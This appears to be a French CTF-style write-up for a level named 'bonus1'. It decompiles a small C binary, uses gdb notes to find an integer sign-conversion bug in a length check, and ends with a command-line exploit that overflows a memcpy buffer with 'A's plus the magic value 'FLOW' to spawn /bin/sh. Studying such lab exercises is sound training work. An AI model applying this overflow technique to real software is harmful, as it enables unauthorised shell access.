int main(int ac, char **av)//av[1], av[2]
{
	//av[1]: 0xbffff8e6
	//av[2]: 0xbffff8f2
	int ecx = atoi(av[1]);//0xbffff6fc
	if (ecx > 9)
		return (0);
	ecx *=4;



	memcpy(0xbffff6d4, av[2], ecx);
	if (*(void*)0xbffff6fc == 0x574f4c46)// on compare le contenu de l adresse 0xbffff6fc
//(gdb) p/d 0xbffff6fc-0xbffff6d4
//$1 = 40
//Nous devons donc placer 
		execl('/bin/sh', 'sh');
	return (0);
}

//Si on met -1 en premier argument, on obtient 0xfffffffc en troisieme argument de memcpy, et 0xfffffff8 si on met -2.
//On peut en deduire que nous demarrons de 4294967295 et que chaque unite negative decremente ce nombre de 4.

//Nous avone une vulnerabilite de conversion de signe, Type Demotion/Narrowing ou de int min (je pense plus a une conversion de signe par rapport au ), comme indiquer sur cette page:
//https://blog.feabhas.com/2014/10/vulnerabilities-in-c-when-integers-go-bad/#What_are_the_potential_underlying_problems
//maxInt: 2 147 483 647
//(gdb) p/d 0xc000000c
//$3 = 3221225484
//(gdb) x/wx $esp+0x3c
//0xbffff6fc:     0xc000000c
//Le premier c represente le bit de signe

(gdb) p/d 0xffffffff
$4 = 4294967295
(gdb) p/d 4294967295-44
$1 = 4294967251
(gdb) p/d 4294967251/4
==> $2 = 1073741812
(gdb) p/d 4294967251%4
$3 = 3


Avec -1073741812 en 1er parametre nous obtenons 44 en troisieme param de memcpy


./bonus1 -1073741812 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
\x46\x4c\x4f\x57: A main+84 on nous demande cette valeur (0x574f4c46) qui signifie "FLOW" en ascii
